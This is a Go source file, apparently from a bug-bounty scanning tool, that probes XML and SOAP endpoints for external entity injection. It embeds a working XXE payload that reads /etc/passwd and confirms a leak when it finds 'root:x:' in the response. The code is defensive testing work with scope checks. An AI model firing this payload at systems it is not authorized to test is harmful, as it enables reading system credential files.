// Package xxe probes XML/SOAP-accepting endpoints for XML external entity
// injection. It POSTs a classic error-based payload (file:///etc/passwd) to
// endpoints that look XML-capable and confirms on leaked file content; endpoints
// that accept XML but give no leak are emitted as candidates for OOB testing
// (the interactsh-based blind variant is a manual follow-up).
//
//   - CONFIRMED: response carries file-read evidence (root:x: / daemon:).
//   - CANDIDATE: endpoint parsed the XML body (no reject) — XXE surface.
//
// Hosts gated through iohelp.InScope; scope-hardened client.
package xxe

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/CyberShuriken/rfuf/internal/findings/internal/iohelp"
)

const urlCap = 600

// errorPayload reads /etc/passwd via an external entity; benignPayload just
// tests whether the endpoint parses XML at all.
const (
	errorPayload  = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`
	benignPayload = `<?xml version="1.0"?><r>rfufxmlprobe</r>`
)

// xmlHints mark a URL as worth an XML POST probe.
var xmlHints = []string{"xml", "soap", "/api", "/rpc", "/ws", "wsdl", "/upload", "/import"}

func Run(workDir string) error {
	urls, err := iohelp.ReadLines(workDir + "/all_urls_200.txt")
	if err != nil || len(urls) == 0 {
		urls, _ = iohelp.ReadLines(workDir + "/alive.txt")
	}
	if len(urls) == 0 {
		return writeOut(workDir, nil, nil)
	}
	if len(urls) > urlCap {
		urls = urls[:urlCap]
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	client := hardenedClient()

	var mu sync.Mutex
	var confirmed, candidates []string
	sem := make(chan struct{}, 15)
	var wg sync.WaitGroup
	seen := map[string]bool{}
	for _, raw := range urls {
		field := strings.Fields(raw)
		if len(field) == 0 {
			continue
		}
		u, err := url.Parse(field[0])
		if err != nil || u.Host == "" || !iohelp.InScope(u.Hostname()) {
			continue
		}
		if !looksXMLCapable(u) {
			continue
		}
		key := u.Scheme + "://" + u.Host + u.Path
		if seen[key] {
			continue
		}
		seen[key] = true
		wg.Add(1)
		sem <- struct{}{}
		go func(u *url.URL) {
			defer wg.Done()
			defer func() { <-sem }()
			state, detail := probe(ctx, client, u.String())
			if state == "" {
				return
			}
			mu.Lock()
			if state == "confirmed" {
				confirmed = append(confirmed, "HIGH\t"+u.String()+"\txxe\t"+detail)
			} else {
				candidates = append(candidates, u.String()+"\txxe\t"+detail+"\tvalidation=candidate")
			}
			mu.Unlock()
		}(u)
	}
	wg.Wait()
	return writeOut(workDir, confirmed, candidates)
}

func looksXMLCapable(u *url.URL) bool {
	p := strings.ToLower(u.Path)
	for _, h := range xmlHints {
		if strings.Contains(p, h) {
			return true
		}
	}
	return false
}

func probe(ctx context.Context, client *http.Client, rawURL string) (state, detail string) {
	// Error-based confirmation first.
	status, body := post(ctx, client, rawURL, errorPayload)
	if status == 0 {
		return "", ""
	}
	if strings.Contains(body, "root:x:") || strings.Contains(body, "daemon:") {
		return "confirmed", "file:///etc/passwd leaked via XXE"
	}
	// Did the endpoint accept/parse XML at all?
	bStatus, bBody := post(ctx, client, rawURL, benignPayload)
	if bStatus > 0 && bStatus < 500 && (strings.Contains(bBody, "rfufxmlprobe") || strings.Contains(strings.ToLower(bBody), "xml")) {
		return "candidate", "endpoint parses XML body — probe for OOB/blind XXE manually"
	}
	return "", ""
}

func post(ctx context.Context, client *http.Client, rawURL, payload string) (int, string) {
	req, err := iohelp.NewRequestWithContext(ctx, "POST", rawURL, strings.NewReader(payload))
	if err != nil {
		return 0, ""
	}
	req.Header.Set("User-Agent", "rfuf-xxe/1.0")
	req.Header.Set("Content-Type", "application/xml")
	iohelp.ApplyAuth(req)
	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp.StatusCode, string(body)
}

func hardenedClient() *http.Client {
	c := &http.Client{Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	iohelp.HardenClient(c)
	return c
}

func writeOut(workDir string, confirmed, candidates []string) error {
	if err := iohelp.WriteLines(workDir+"/xxe_findings.txt", confirmed); err != nil {
		return err
	}
	return iohelp.WriteLines(workDir+"/xxe_candidates.txt", candidates)
}
